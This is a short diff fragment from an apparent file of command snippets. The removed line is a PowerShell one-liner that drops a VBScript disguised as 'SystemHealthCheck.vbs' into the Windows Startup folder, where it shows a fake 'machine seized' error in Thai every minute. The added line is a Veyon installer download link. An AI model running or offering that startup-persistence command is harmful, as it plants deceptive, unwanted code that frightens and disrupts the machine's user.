@@ -5,7 +5,7 @@ $path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemHealth
 ```
 
 ```bash
-$path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemHealthCheck.vbs"; $code = 'Do : MsgBox "แฮ่! เครื่องนี้โดนยึดแล้ว", 16, "System Error" : WScript.Sleep 60000 : Loop'; Set-Content -Path $path -Value $code -Encoding ASCII; Start-Process wscript.exe -ArgumentList """$path"""
+https://github.com/veyon/veyon/releases/download/v4.10.2/veyon-4.10.2.0-win64-setup.exe
 ```
 
 ```bash
